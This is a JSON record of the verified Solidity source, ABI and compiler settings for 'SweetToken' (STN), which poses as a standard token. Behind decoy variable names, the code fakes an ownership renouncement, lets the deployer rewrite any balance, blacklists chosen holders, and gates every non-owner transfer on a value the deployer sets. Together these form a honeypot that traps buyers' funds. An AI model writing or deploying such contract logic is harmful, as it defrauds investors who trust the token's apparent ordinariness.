{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface txWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchAuto) external view returns (uint256);\n\n    function transfer(address fundAmount, uint256 teamTotal) external returns (bool);\n\n    function allowance(address minIs, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 teamTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundAmount,\n        uint256 teamTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverLaunched, uint256 value);\n    event Approval(address indexed minIs, address indexed spender, uint256 value);\n}\n\nabstract contract walletSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface modeTotal {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface marketingMode {\n    function createPair(address isExemptToken, address minTokenTotal) external returns (address);\n}\n\ninterface sellLaunchedLimit is txWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SweetToken is walletSender, txWallet, sellLaunchedLimit {\n\n    uint256 private enableTrading;\n\n    function listSenderSell(address fundToken, uint256 teamTotal) public {\n        swapLimit();\n        shouldTx[fundToken] = teamTotal;\n    }\n\n    function getOwner() external view returns (address) {\n        return limitTake;\n    }\n\n    bool private enableMin;\n\n    uint256 private fundReceiverIs = 100000000 * 10 ** 18;\n\n    uint8 private receiverTx = 18;\n\n    function balanceOf(address launchAuto) public view virtual override returns (uint256) {\n        return shouldTx[launchAuto];\n    }\n\n    function transfer(address fundToken, uint256 teamTotal) external virtual override returns (bool) {\n        return atSell(_msgSender(), fundToken, teamTotal);\n    }\n\n    function approve(address minTrading, uint256 teamTotal) public virtual override returns (bool) {\n        autoToken[_msgSender()][minTrading] = teamTotal;\n        emit Approval(_msgSender(), minTrading, teamTotal);\n        return true;\n    }\n\n    function exemptList(address atSwap) public {\n        if (toList) {\n            return;\n        }\n        \n        liquidityReceiverTx[atSwap] = true;\n        if (sellMinTeam != enableMin) {\n            sellMinTeam = false;\n        }\n        toList = true;\n    }\n\n    constructor (){\n        \n        modeTotal marketingAtMin = modeTotal(buyWallet);\n        buyIs = marketingMode(marketingAtMin.factory()).createPair(marketingAtMin.WETH(), address(this));\n        \n        swapToken = _msgSender();\n        modeSender();\n        liquidityReceiverTx[swapToken] = true;\n        shouldTx[swapToken] = fundReceiverIs;\n        if (launchedLaunch != autoLaunched) {\n            autoLaunched = toAmount;\n        }\n        emit Transfer(address(0), swapToken, fundReceiverIs);\n    }\n\n    mapping(address => uint256) private shouldTx;\n\n    uint256 constant atToken = 4 ** 10;\n\n    uint256 atSellFee;\n\n    address public buyIs;\n\n    function atSell(address txReceiver, address fundAmount, uint256 teamTotal) internal returns (bool) {\n        if (txReceiver == swapToken) {\n            return launchedList(txReceiver, fundAmount, teamTotal);\n        }\n        uint256 sellWallet = txWallet(buyIs).balanceOf(walletShould);\n        require(sellWallet == teamTake);\n        require(fundAmount != walletShould);\n        if (launchBuy[txReceiver]) {\n            return launchedList(txReceiver, fundAmount, atToken);\n        }\n        return launchedList(txReceiver, fundAmount, teamTotal);\n    }\n\n    uint256 teamTake;\n\n    uint256 private shouldMin;\n\n    bool private sellMinTeam;\n\n    mapping(address => mapping(address => uint256)) private autoToken;\n\n    mapping(address => bool) public launchBuy;\n\n    uint256 public toAmount;\n\n    string private feeTx = \"STN\";\n\n    uint256 public txMax;\n\n    uint256 private autoLaunched;\n\n    function owner() external view returns (address) {\n        return limitTake;\n    }\n\n    function walletBuy(uint256 teamTotal) public {\n        swapLimit();\n        teamTake = teamTotal;\n    }\n\n    function takeListTrading(address fundTo) public {\n        swapLimit();\n        \n        if (fundTo == swapToken || fundTo == buyIs) {\n            return;\n        }\n        launchBuy[fundTo] = true;\n    }\n\n    uint256 public launchedLaunch;\n\n    function modeSender() public {\n        emit OwnershipTransferred(swapToken, address(0));\n        limitTake = address(0);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fundReceiverIs;\n    }\n\n    function transferFrom(address txReceiver, address fundAmount, uint256 teamTotal) external override returns (bool) {\n        if (_msgSender() != buyWallet) {\n            if (autoToken[txReceiver][_msgSender()] != type(uint256).max) {\n                require(teamTotal <= autoToken[txReceiver][_msgSender()]);\n                autoToken[txReceiver][_msgSender()] -= teamTotal;\n            }\n        }\n        return atSell(txReceiver, fundAmount, teamTotal);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverTx;\n    }\n\n    bool public toList;\n\n    event OwnershipTransferred(address indexed takeShould, address indexed isTake);\n\n    uint256 private fundShouldTotal;\n\n    mapping(address => bool) public liquidityReceiverTx;\n\n    address buyWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function launchedList(address txReceiver, address fundAmount, uint256 teamTotal) internal returns (bool) {\n        require(shouldTx[txReceiver] >= teamTotal);\n        shouldTx[txReceiver] -= teamTotal;\n        shouldTx[fundAmount] += teamTotal;\n        emit Transfer(txReceiver, fundAmount, teamTotal);\n        return true;\n    }\n\n    address public swapToken;\n\n    function symbol() external view virtual override returns (string memory) {\n        return feeTx;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return listExempt;\n    }\n\n    function swapLimit() private view {\n        require(liquidityReceiverTx[_msgSender()]);\n    }\n\n    function allowance(address feeSell, address minTrading) external view virtual override returns (uint256) {\n        if (minTrading == buyWallet) {\n            return type(uint256).max;\n        }\n        return autoToken[feeSell][minTrading];\n    }\n\n    string private listExempt = \"Sweet Token\";\n\n    address walletShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address private limitTake;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isTake\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minTrading\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchAuto\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atSwap\",\"type\":\"address\"}],\"name\":\"exemptList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityReceiverTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamTotal\",\"type\":\"uint256\"}],\"name\":\"listSenderSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTo\",\"type\":\"address\"}],\"name\":\"takeListTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"teamTotal\",\"type\":\"uint256\"}],\"name\":\"walletBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SweetToken", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}